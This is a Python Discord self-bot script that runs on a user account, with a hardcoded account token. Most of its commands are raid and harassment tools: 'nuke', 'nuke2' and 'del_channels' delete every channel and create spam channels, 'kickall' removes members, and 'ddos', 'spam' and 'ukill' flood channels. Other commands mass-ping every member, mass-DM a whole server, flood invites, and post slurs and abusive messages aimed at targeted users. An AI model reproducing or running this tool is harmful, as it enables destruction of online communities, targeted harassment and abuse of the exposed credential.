import discord
import time
from subprocess import call
from discord.ext import commands
import os
import base64
import random
import os
import asyncio
import requests
from collections import defaultdict
import openai
import threading
import pyfiglet
import sys
import pyautogui
from mss import mss
import win32api
from gtts import gTTS
import io
from colorama import Fore


password = "ilovemyshit"

no_leave = []


red = Fore.RED
countt = 0



bot = commands.Bot(command_prefix='.', self_bot=True)

token = "MTIyNjk4NDAyMTI2ODEwNzMzMg.GoLKib.-26XfLaCbmPPfTVzmK32dpH1bWIDsDbUqixbO0"




copy = "True"

ids = [1319476629487095909]




@bot.command()
async def ukill(ctx, user: discord.Member):
    await ctx.send(f'{user.mention} ready to be killed?')
    time.sleep(3)
    for i in range(500):
        await ctx.send(f'{user.mention} https://images.gr-assets.com/hostedimages/1396484628ra/9141137.gif')
    

    



@bot.command()
async def meclear(ctx, amount):
    await ctx.message.delete()
    def check(message):
        return message.author == bot.user
    if amount is None:
        amount = 100
    try:
        deleted = await ctx.channel.purge(limit=amount, check=check)
    except discord.HTTPException:
        await ctx.channel.send('**failed to delete messages**')
        



@bot.event
async def on_relationship_remove(friend):
    member = friend
    print(Fore.RED + f'{member} has been removed from your friend list')
    
    
@bot.command()
async def add_nick(ctx, member: discord.Member, *, nickname):
    await member.edit(nick=nickname)
    await ctx.send(f'nick added')
    
    



@bot.command()
async def create_channel(ctx, name, *, nsfw=False):
    channel = await ctx.guild.create_text_channel(name=name, nsfw=nsfw)
    await ctx.channel.send(f'{name} created')




@bot.event
async def on_group_remove(ctx, member):
    if member.id in no_leave:
      await ctx.add_recipients(member)
      print(f'{member.name} has been added back to the gc')




@bot.command()
async def ddos3(ctx, arg):
    text = arg
    for i in range(50):
        await ctx.send(text)


@bot.command()
async def ddos_member(ctx, arg):
    member = arg
    for i in range(50000):
        await ctx.send(f'{member} https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif ')



@bot.command()
async def speak_text(ctx, *, text: str=None):
    content = text
    if not content:
        await ctx.send('please enter some text')
        return
    speak = content.strp()
    tts = gTTS(text=content, lang="en")
    f = io.BytesIO()    
    tts.write_to_fp(f)
    f.seek(0)
    await ctx.send(file=discord.File(f, f"{content[:10]}.wav"))
    
    
    
@bot.command()
async def quick_delete(ctx, *, message: str=None):
    if not message:
        await ctx.send('please enter a message')
        return
    await ctx.send(message, delete_after=2)
    
    
@bot.command()
async def uicon(ctx, user: discord.User = None):
    arg = user
    if not arg:
        await ctx.send('please enter a user')
        return
    avatar_url = user.avatar_url if user.avatar else user.defualt_avatar.url
    await ctx.send(f"{user.mention}'s avatar:{avatar_url}")
    
    

@bot.command()
async def reverse(ctx, arg):
    text = arg
    if not text:
        await ctx.send('please enter some text')
        return
    content = text[::-1]
    await ctx.send(text)

    

    
    

    
    
    
    
  
@bot.command()
async def datetime(ctx):
    time_now = datetime.now(datetime.timezone.utc)
    await ctx.send(time_now)


  

@bot.command()
async def ddos2(ctx):
   await ctx.send('destroy starting')
   time.sleep(3)
   for i in range(5000):
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif') 
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')



     
     
     
     







@bot.command()
async def ddos1(ctx,  message):
    msg = message
    for i in range(505):
        await ctx.send(msg)
        
    
        
    
    



@bot.command()
async def fire(ctx):
    await ctx.send('🔥')
    
@bot.command()
async def bold(ctx, arg):
    await ctx.send(f'**{arg}**')


@bot.event
async def on_message_delete(message):
    print(f"message deleted: {message.content} ")
    




@bot.command()
async def notepad(ctx):
    os.system('start notepad')
    await ctx.send('opened notepad')



@bot.command()
async def cmd(ctx):
    os.system('start cmd')
    await ctx.send('cmd opened')
     
   


@bot.command()
async def screenShot(ctx):
    with mss() as sct:
        sct.shot()
        ctx.send('screenshot saved')
        
        




@bot.event
async def on_command(command):
  print('a command has been used.')


@bot.command()
async def new_destroy(ctx):
  payload = {"content": "https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif"}
  headers = {"authorization": token}
  url = f'https://discord.com/api/v9/channels/1337797572269445162/messages'
  for i in range(50):
    r = requests.post(url, json=payload, headers=headers)

@bot.command()
async def nigga(ctx):
  for i in range(500):
    time.sleep(1)
    await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')


@bot.command()
async def send_all(anmount):
  channels = bot.get_all_channels()
  for channel in channels():
        await bot.send_message(channel, 'lol nuked by Maryellen')



@bot.command()
async def pinspam(ctx):
  for i in range(10):
    await ctx.message.pin()
  




@bot.command()
async def about(ctx):
  await ctx.send('about: made by PackJX$TICE')
  await ctx.send('NOTE: this author may have a new name')

@bot.command()
async def choice(ctx):
  answer = ["yes", "no"]
  await ctx.send(f"{random.choice(answer)}")


  


@bot.command()
async def spam(ctx, amount:int, *, message):
  for i in range(amount):
    await ctx.send(message)
 
def restart_bot(): 
  os.execv(sys.executable, ['python'] + sys.argv)

@bot.command()
async def stop(ctx):
  await ctx.send("Stopping all commands....")
  restart_bot()



@bot.command()
async def shutdown(ctx):
  await ctx.send('shutdown starting')
  os.system("shutdown -s")




@bot.command()
async def create_channels(ctx):
  guild = ctx.guild
  for i in range(200):
    await guild.create_text_channel('fire')



@bot.command()
async def nuke(ctx):
  guild = ctx.guild
  for channel in guild.channels:
    await channel.delete()

    for i in range(200):
      await guild.create_text_channel('nuked')

      everyone_role = guild.default_role

      for channel in guild.channels:
        for i in range(15):
          await channel.send(f'@everyone @here nuked by Maryellen')


@bot.command()
async def Hackspam(ctx, arg):
  for i in range(20):
    await ctx.send(f' {arg} https://c.tenor.com/rePDfDWO3XoAAAAd/hacking.gif')
    time.sleep(0)
    await ctx.send(f' {arg} https://gifdb.com/images/high/hacker-you-have-been-hacked-snt8b8zv3tqqm8xa.gif')
    time.sleep(0)
    await ctx.send(f' {arg} https://tse2.mm.bing.net/th?id=OIP._cn8HG62M0PIVFqSfgGtcQAAAA&pid=Api&P=0&h=220')
    time.sleep(0)
    await ctx.send(f' {arg} {arg} {arg} https://i.gifer.com/3Tt5.gif')
    time.sleep(0)
    await ctx.send(f' {arg} https://giphy.com/gifs/JN7XjuP2Hdscnoki9c')
    time.sleep(0)
    await ctx.send(f' {arg} https://i.makeagif.com/media/9-14-2013/cPXaHE.gif')
    time.sleep(0)
    await ctx.send(f' {arg} https://giffiles.alphacoders.com/174/1744.gif')


@bot.command()
async def off(ctx):
  await ctx.send("shuting down selfbot")
  os.system("exit")




    


    
@bot.command()
async def cat_mad(ctx):
  await ctx.send('https://tse2.explicit.bing.net/th?id=OIP.HOJ1DQlR9_kanWyF6cT2TwHaHa&pid=Api&P=0&h=220')

  

    
@bot.command()
async def cat_happy(ctx):
  await ctx.send('https://tse2.mm.bing.net/th?id=OIP.JeNpPPpUorli-2A2EQ87oQHaHa&pid=Api&P=0&h=220')




@bot.command()
async def cat_sad(ctx):
  await ctx.send('https://wallpapercave.com/wp/wp3021105.jpg')



@bot.command()
async def server_destroy(ctx):
  for i in range(500):
    await ctx.send(' https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')


 





@bot.command()
async def self_destroy(ctx, amount:int, userid, *, user: discord.User = None):
  user = ctx.author
  for i in range(amount):
     await ctx.send(f'Fuck yourself weng owns you {userid}')


@bot.command()  
async def dice(ctx):
    await ctx.send(f'''```ansi
[0;31mNumber:[0m[0;36m {random.randint(1, 6)}[0;35m
```''')

@bot.command()
async def clear(ctx, amount: int):
  for i in range(amount):
    await ctx.messgae.delete()


@bot.command(aliases=['myping'])  # Ping command
async def ping(ctx):
    before = time.monotonic()
    message = await ctx.send("Pong!")
    ping = (time.monotonic() - before) * 1000
    await message.edit(content=f"*Pong!* ***__`{int(ping)}ms`__***")


@bot.command(aliases=['makechannels'])  # Make channels command
@commands.has_permissions(manage_channels=True)
async def mk_channels(ctx, arg1, arg2):
    channel_names = ['nuked by Dj', 'nuked by bart selfbot', 'nuked by FbI baby hecker', 'baby hecker owns you', 'baby hecker ruins you', 'this is what you get']
    guild = ctx.message.guild
    amount = int(arg1)
    for x in range(amount):
        if arg2 == 'random':
            name = random.choice(channel_names)
            await guild.create_text_channel(name)
        else:
            await print(f'could not make channels in {guild}')


@bot.command(aliases=['delchannels'])  # Delete channels command
@commands.has_permissions(manage_channels=True)
async def del_channels(ctx):
    for c in ctx.guild.channels:
        await c.delete()


@bot.command(aliases=['name_channels'])  # Rename channels command
@commands.has_permissions(manage_channels=True)
async def rename_channels(ctx, arg):
    for c in ctx.guild.channels:
        await c.edit(name=arg)


@bot.command()  # Nuke command
@commands.has_permissions(manage_guild=True)
async def nuke2(ctx, arg1, arg2):
    for c in ctx.guild.channels:
        await c.delete()

    guild = ctx.message.guild
    amount = int(arg1)
    for x in range(amount):
        channel = await guild.create_text_channel(arg2)
        await channel.send('@everyone Maryellen ruins you ')
        await ctx.guild.edit(name='Maryellen owns this server')

    



@bot.command()
async def destory_user(ctx, arg1, arg2):
    amount = int(arg1)
    for x in range(amount):
        await ctx.send(arg2)


    




         
                
            
        







  

@bot.command()  # Activity command
async def activity(ctx, arg):
    await bot.change_presence(activity=discord.Game(name=arg))


@bot.command(aliases=['delhook'])  # Delete webhook command
async def delete_webhook(ctx, arg):
    requests.delete(arg)





@bot.command()  # ID info command
async def idinfo(ctx, arg):
    pfp = ctx.pfp
    user_data = ctx.discord_data(token, pfp, arg)
    await ctx.send(user_data)




@bot.command()
async def baby_hecker(ctx):
    call(["python", "main.py"])




    
    



         








@bot.command(aliases=['statuscode'])  # Get status code command
async def status_code(ctx, arg):
    r = requests.get(arg)
    await ctx.send(f'**`Status code: {r.status_code}`**')






@bot.command(aliases=['coinflip'])  
async def coin_flip(ctx):
    options = ['Heads', 'Tails']
    bot_flip = random.choice(options)
    await ctx.send(f'**`{bot_flip}`**')



@bot.command()
async def pack(ctx, arg2):
    global spam
    spam = True
    while True:
      f = open('text.txt', 'r')
      for x in f:
         time.sleep(1)
         await ctx.channel.send(f'{arg2} {x}')





@bot.command()
async def leave(ctx, *, server_name_or_id):
 
    try:
        server_id = int(server_name_or_id)
        guild = bot.get_guild(server_id)
    except ValueError:
        # If conversion fails, look for a guild by name
        guild = discord.utils.get(bot.guilds, name=server_name_or_id)

    if guild:
        await guild.leave()
        await ctx.send(f"Left the server: {guild.name}")
    else:
        await ctx.send("Server not found.")
     



        


        
          
@bot.command()
async def boobs(ctx):
    goo = 'https://tse2.explicit.bing.net/th?id=OIP.7Oyi868fI4hozD5uNGMKiAAAAA&pid=Api&P=0&h=220'
    go = 'https://media.discordapp.net/attachments/1326333959772045372/1327792821440221205/549b4a50c25f4cce4d26.gif?ex=67845aed&is=6783096d&hm=5dfd9ad65a4b18983bd0dd1114fda92e080f433635bff3ab83a1e71cc170b3e6&=&width=472&height=649'
    await ctx.channel.send(go)
    await ctx.channel.send(goo)

@bot.command()
async def pic(ctx, user: discord.Member=None):
  member = ctx.author
  icon_url = user.avatar_url
  print(icon_url)
  await ctx.send(icon_url)
    



@bot.command(aliases=['massmention'])  
async def mass_mention(ctx, arg):
    guild = ctx.message.guild

    amount = int(arg)

    await ctx.message.delete()
    members = ''

    for member in guild.members:
        if not member.bot:
            members += f'{member.mention}'

    n = 2000

    pings = (members, 2000)

    for _ in range(amount):
        for ping in pings:
            await ctx.send(ping)



@bot.command(aliases=['ping_everyone'])  # Ping everyone even without perms
async def pinghack(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    members = ''

    for member in guild.members:
        if not member.bot:
            members += f'{member.mention}'

    everyoneping = f'''@everyone ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ {members}'''
    await ctx.send(everyoneping[0:2000])



@bot.command()  # Clones server
async def clone_server(ctx):
    await ctx.message.delete()
    server = ctx.message.guild
    roles = server.roles

    guild = await bot.create_guild(ctx.message.guild.name)

    for cg in server.categories:
        category = await guild.create_category(cg.name)

        for channel in cg.channels:
            if isinstance(channel, discord.VoiceChannel):
                vc = await category.create_voice_channel(channel.name)
                overwrites = channel.overwrites
                await vc.edit(overwrites=overwrites)

            if isinstance(channel, discord.TextChannel):
                cha = await category.create_text_channel(channel.name)
                overwrites = channel.overwrites
                await cha.edit(overwrites=overwrites)

    for role in roles:
        role = await guild.create_role(name=role.name,
                                       permissions=discord.Permissions(permissions=role.permissions.value))

    try:
        await guild.edit(icon=ctx.message.guild.icon)
    except:
        pass


@bot.command(aliases=['find_name'])  # Show users that name starts with x
async def namestarts(ctx, arg):
    mlist = ''

    guild = ctx.message.guild
    for member in guild.members:
        name = member.name
        if name.startswith(arg):
            mlist += f'{name}#{member.discriminator}\n'

    await ctx.send(f'''```{mlist}```''')



@bot.command(aliases=['find_tag'])  # Show users that have specific discriminator
async def tagfind(ctx, arg):
    mlist = ''

    guild = ctx.message.guild
    for member in guild.members:
        discriminator = member.discriminator

        if discriminator == arg:
            mlist += f'{member.name}#{discriminator}\n'

    await ctx.send(f'''```{mlist}```''')




@bot.command()  # Annoys the chat
async def annoy(ctx):
    sz = await ctx.send('hi')
    for x in range(10):
        text1 = 'hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii'
        text2 = 'hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii'
        text3 = 'hiii'
        await sz.edit(content=text1)
        await sz.edit(content=text2)
        await sz.edit(content=text3)




@bot.command()  # countdown
async def count(ctx, arg):
    number = int(arg)
    message = ctx.message

    for x in range(number):
        time.sleep(0.9)
        await message.edit(content=f'**`{x}`**')


@bot.command()  # edit glitch
async def editg(ctx, arg):
    message = ctx.message
    msg_content = arg.replace('(edited)', '\u202B')

    await message.edit(content=msg_content)


@bot.command(aliases=['dmserver'])  # dm members
async def dm_members(ctx, arg1, arg2, arg3):
    guild = ctx.message.guild
    await ctx.message.delete()
    amount = int(arg2)

    if arg3 != 'on':
        status_msg = await ctx.send('***`Starting to message people...`***')

    for member in guild.members:
        if member == bot.user:
            continue
        else:
            try:
                dm_channel = await member.create_dm()
                time.sleep(0.1)
                await dm_channel.send(arg1)
                time.sleep(amount)
                if arg3 != 'on':
                    await status_msg.edit(content=f'***`I just messaged {member}`***')
            except:
                continue



@bot.command(aliases=['first_msg', 'firstmessage', 'first_message'])  # Gets first message
async def firstmsg(ctx):
    await ctx.message.delete()
    channel = ctx.message.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]

    await ctx.send(f'***First message: __{first_message.jump_url}__***')


@bot.command()  # changes everyones nickanme
@commands.has_permissions(manage_nicknames=True)
async def nickall(ctx, arg):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=arg)
        except:
            pass



@bot.command(aliases=['remove_names'])  # clears everyones nickname
@commands.has_permissions(manage_nicknames=True)
async def clearnickall(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=user.name)
        except:
            pass


@bot.command()  # kicks all
@commands.has_permissions(kick_members=True)
async def kickall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        await ctx.guild.kick(member)




@bot.command(aliases=['react_messages'])  # React to messages
@commands.has_permissions(add_reactions=True)
async def react(ctx, arg):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(arg)



@bot.command()  # Measure how gay someone is
async def gay(ctx, arg):
    await ctx.message.delete()
    await ctx.send(f'***__{arg} is {random.randint(0, 100)}% gay__***')





@bot.command()  # send shit every channel wow
async def broadcast(ctx, arg1, arg2):
    await ctx.message.delete()
    times = int(arg1)
    for _ in range(times):
        for channel in ctx.message.guild.text_channels:
            try:
                await channel.send(arg2)
            except:
                continue






@bot.command()  # count from to
async def counter(ctx, arg1, arg2):
    await ctx.message.delete()
    ffrom = int(arg1)
    ffrom += 1
    fto = int(arg2)

    irange = fto - ffrom
    irange += 1

    for c in range(irange):
        num = c + ffrom
        await ctx.send(num)


@bot.command()  # raid with 0 perms
async def raid(ctx):
    await ctx.message.delete()

    members = ''
    guild = ctx.message.guild

    for member in guild.members:
        members += f'{member.mention}'

    ping = members[0:1990]

    for _ in range(5):
        for channel in ctx.message.guild.text_channels:
            try:
                await channel.send('hiiii')
                rekt = await channel.send(f'{ping} @everyone')
                        
            except:
                continue

@bot.command(aliases=['broadcast_ping', 'ping_channels'])  # mass mention every channel
async def pingcast(ctx):
    await ctx.message.delete()

    members = ''
    guild = ctx.message.guild

    for member in guild.members:
        if not member.bot:
            members += f'{member.mention}'

    pings = (members, 1990)

    for ping in pings:
        for channel in ctx.message.guild.text_channels:
            try:
                await channel.send(f'{ping} @everyone')
            except:
                continue


@bot.command(aliases=['floodaudit'])  # audit flood
async def auditflood(ctx, arg):
    await ctx.message.delete()

    amount = int(arg)
    for _ in range(amount):
        await ctx.message.channel.create_invite(max_age=0, max_uses=0)









@bot.command(aliases=['specialcast', 'special_broadcast'])  # special broadcasts
async def speccast(ctx, opt):
    await ctx.message.delete()

    if opt == 'pinghack':
        guild = ctx.message.guild
        members = ''
        for member in guild.members:
            if not member.bot:
                members += f'{member.mention}'

        everyoneping = f'''@everyone ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ {members}'''

        for channel in ctx.message.guild.text_channels:
            try:
                await channel.send(everyoneping[0:2000])
            except:
                continue

    if opt == 'clear':
        for channel in ctx.message.guild.text_channels:
            try:
                await channel.send('hi')
            except:
                continue

    if opt.startswith('art='):
        text = opt[4:100]
        result = pyfiglet.figlet_format(text)
        for channel in ctx.message.guild.text_channels:
            try:
                await channel.send(f'```{result}```')
            except:
                continue



@bot.command()  # cool ascii art
async def asciiart(ctx, arg1, arg2):
    await ctx.send(f'```{pyfiglet.figlet_format(arg1, font=arg2)}```')


@bot.command()  # leaves current vc
async def vc_leave(ctx):
    voice_client = ctx.message.guild.voice_client
    if voice_client.is_connected():
        await voice_client.disconnect()
    else:
        await ctx.send("*`I am not connected to a vc`*")


@bot.command(aliases=['roleping', 'pingroles'])  # Ping server roles trolololo
async def rolemention(ctx, arg):
    guild = ctx.message.guild

    amount = int(arg)

    await ctx.message.delete()
    roles = ''

    for role in guild.roles:
        roles += f'<@&{role.id}>'

    n = 2000

    pings = (roles, n)

    for _ in range(amount):
        for ping in pings:
            await ctx.send(ping)


@bot.command(aliases=['pingid'])  # id ping
async def idping(ctx, arg):
    int(arg)
    str(arg)
    await ctx.message.delete()
    await ctx.send(f'<@{arg}>')



@bot.command(aliases=['pingchannel'])  # ping channel
async def channelping(ctx, arg):
    int(arg)
    str(arg)
    await ctx.message.delete()
    await ctx.send(f'<#{arg}>')


@bot.command(aliases=['locker', 'glock'])  # grouplock
async def noleave(ctx, arg):
    if arg == "ON" or arg == "on":
        global grouplock_group
        global grouplock
        global gmembers
        global reslock

        grouplock = True

        grouplock_group = ctx.channel.id
        
        gmembers = ['1252244664707190787']

        reslock = requests.get(f"https://discord.com/api/v10/channels/{grouplock_group}",
                               headers={
                                   "authorization": token}).json()
        for member in reslock['recipients']:
            gmembers.append(member['id'])
       
        await ctx.send(f'**`Group is now locked!`**')

    elif arg == "OFF" or arg == "off":
        grouplock = False
        grouplock_group = 0
        gmembers = []
        reslock = ''

        await ctx.send('**`Group is now unlocked`**')

    else:
        a = "do jackshit /shrug"
 





@bot.command()
async def gpam(ctx, arg1, arg2):
    channel = ctx.channel
    for i in range(arg2):
        await discord.GroupChannel.edit(channel, name = f'{arg1} ')

@bot.command()
async def spam_gc(ctx):
  count = 1
  await ctx.send('enter the gc id / channel id in cmd')
  channel_id = int(input('gc ID: '))
  channel = bot.get_channel(channel_id)
  while True:
    with open("text.txt") as file:
      for i in range(100):
        lines = [line for line in file.read().splitlines()]
        lines_with_split_text = [line.split(",") for line in lines]
        random_line = random.choice(lines_with_split_text)
        random_text = random.choice(random_line)
        await channel.edit(name=f'{random_text} {count}')
        count += 1

    
@bot.command()
async def ddos(ctx):
   await ctx.send('destroy starting')
   time.sleep(3)
   for i in range(5000):
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')
     await ctx.send('https://i.pinimg.com/originals/f9/e4/49/f9e449fadc68a918f15e71d644a6ede1.gif')



      
      
  
  


@bot.command()
async def gspam(ctx, arg1, arg3, arg4):
    number = int(arg1)
    channel = ctx.channel
    for x in range(number):
        await discord.GroupChannel.edit(channel, name = f'{arg3} {x} ')
        asyncio.sleep(0.0)
        await ctx.channel.send(f' **  {arg4} fuck you bitch you have been roasted by the god bart paul  {x} **')
        asyncio.sleep(0.0)
        await ctx.channel.send(f'** {arg4} you think you so strong huh? but your as week as a bug {x} **')
        asyncio.sleep(0.0)
        await ctx.channel.send(f' ** {arg4} leave  fucking bitch {x} **')
        asyncio.sleep(0.0)
        await ctx.channel.send(f'`you have been spammed by bart {x} `')




@bot.command()
async def hello(ctx):
    await ctx.channel.send('hello')
    

@bot.command()
async def goodbye(ctx):
    await ctx.channel.send('goodbye')



@bot.command()
async def dm(ctx, user: discord.user, *, message=None):
    message = message
    await user.send(message=message)
    await ctx.send('message sent')





@bot.command()
async def send_dm(ctx, member: discord.Member, *, content):
    channel = await member.create_dm()
    await channel.send(content)
    


@bot.command()
async def moo(ctx):
    await ctx.channel.send('moo')
    
    
    
@bot.command()
async def cow(ctx):
    await ctx.channel.send('moo moo moo')
    
    
    
@bot.event
async def on_message_delete(message):
    print(f'deleted message {message.content}')


@bot.command()
async def destroy(ctx):
  for i in range(50):
    await ctx.send('@here @everyone https://i2.imgflip.com/9jh00c.gif')

@bot.command()
async def die(ctx, user):    
  await ctx.send(f' {user} is dead reason: https://i2.imgflip.com/9jgzic.gif')
    
@bot.command()
async def say(ctx, arg):
    await ctx.send(arg)
 
    
@bot.command()
async def deleteAll(ctx):
  await ctx.send('deleting all messsages')
  time.sleep(2)
  for i in range(900):
    time.sleep(2)
    await ctx.message.delete()
    
    
    
@bot.command(name='history')
async def his(ctx, arg):
    arg = int(arg)
    async for message in ctx.channel.history(limit=arg):
        await ctx.send(f"{message.author}: {message.content}")
        
        

@bot.command(name='user_his')
async def his(ctx, idf: int, arg: int):
    # Ensure the number of messages requested is reasonable
    if arg > 100:
        await ctx.send("Please specify a number less than or equal to 100.")
        return

    collected_messages = []  # List to store found messages
    count = 0

    # Search through the channel's message history
    async for message in ctx.channel.history(limit=1000):
        if message.author.id == idf:
            collected_messages.append(f"{message.author}: {message.content}")
            count += 1
            if count >= arg:
                break

    # Send the collected messages
    if collected_messages:
        await ctx.send("\n".join(collected_messages))
    else:
        await ctx.send("No messages found from this user.")
        
        
@bot.command(name="spam3")
async def spam3(ctx, message, arg):
    counter = 0
    while counter < int(arg):
        await ctx.send(message)
        counter += 1
        
        
@bot.command(name='exit')
async def exit(ctx):
    await bot.close()
    


@bot.event
async def on_message_delete(message):
    if message.author == bot.user:
        return
        print(f'message deleted {message.content}')
        
        
@bot.command()
async def packing(ctx, user):
    file = open('roast.txt', 'r') 
    for x in file:
        await ctx.send(f'{user}`{x}`')
        
        


@bot.command()
async def block(ctx, user: discord.User):
    await ctx.send('blocking user')
    time.sleep(5)
    await ctx.send('blocked user')
    await user.block()
    print(f'blocked user: {user}')
    
    
    
    
@bot.command
async def unfriend(ctx, *, user: discord.user):
    await ctx.send('blocking user')
    time.sleep(4)
    await user.remove_friend()
    print('unfriend user: {user}')
    
    
    
    
@bot.command()
async def leave_gcs(ctx):
    for gc in bot.private_channels:
        if isinstance(gc, discord.GroupChannel):
            try:
                await gc.send('clearing my dms up niggas')
                await gc.leave()
